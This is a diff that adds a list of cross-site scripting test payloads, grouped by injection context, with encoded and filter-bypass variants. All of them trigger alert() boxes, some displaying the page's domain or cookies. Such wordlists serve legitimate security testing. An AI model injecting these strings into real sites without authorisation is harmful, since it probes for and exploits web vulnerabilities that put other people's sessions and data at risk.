@@ -1,0 +1,68 @@
+# XSS Payloads
+# Basic payloads
+<script>alert(1)</script>
+<script>alert('XSS')</script>
+<script>alert(document.domain)</script>
+<script>alert(document.cookie)</script>
+
+# Image-based
+<img src=x onerror=alert(1)>
+<img src=x onerror=alert('XSS')>
+<img/src=x onerror=alert(1)>
+<img src="x" onerror="alert(1)">
+<img src=1 href=1 onerror="javascript:alert(1)">
+
+# SVG-based
+<svg onload=alert(1)>
+<svg/onload=alert(1)>
+<svg onload="alert(1)">
+<svg><script>alert(1)</script></svg>
+
+# Body/Event handlers
+<body onload=alert(1)>
+<body onpageshow=alert(1)>
+<input onfocus=alert(1) autofocus>
+<input onblur=alert(1) autofocus><input autofocus>
+<marquee onstart=alert(1)>
+<details open ontoggle=alert(1)>
+<video><source onerror="alert(1)">
+<audio src=x onerror=alert(1)>
+
+# Attribute breakout
+"><script>alert(1)</script>
+'><script>alert(1)</script>
+"><img src=x onerror=alert(1)>
+'><img src=x onerror=alert(1)>
+" onmouseover="alert(1)" x="
+' onmouseover='alert(1)' x='
+" onfocus="alert(1)" autofocus="
+' onfocus='alert(1)' autofocus='
+
+# JavaScript context
+'-alert(1)-'
+"-alert(1)-"
+';alert(1);//
+";alert(1);//
+\';alert(1);//
+\";alert(1);//
+</script><script>alert(1)</script>
+
+# URL/href context
+javascript:alert(1)
+javascript:alert(document.domain)
+data:text/html,<script>alert(1)</script>
+
+# Encoded payloads
+%3Cscript%3Ealert(1)%3C/script%3E
+&lt;script&gt;alert(1)&lt;/script&gt;
+\x3cscript\x3ealert(1)\x3c/script\x3e
+\u003cscript\u003ealert(1)\u003c/script\u003e
+
+# Filter bypass
+<scr<script>ipt>alert(1)</scr</script>ipt>
+<SCRIPT>alert(1)</SCRIPT>
+<ScRiPt>alert(1)</ScRiPt>
+<script x>alert(1)</script>
+<script>alert(1)//
+<img src=x onerror=alert`1`>
+<svg/onload=alert`1`>
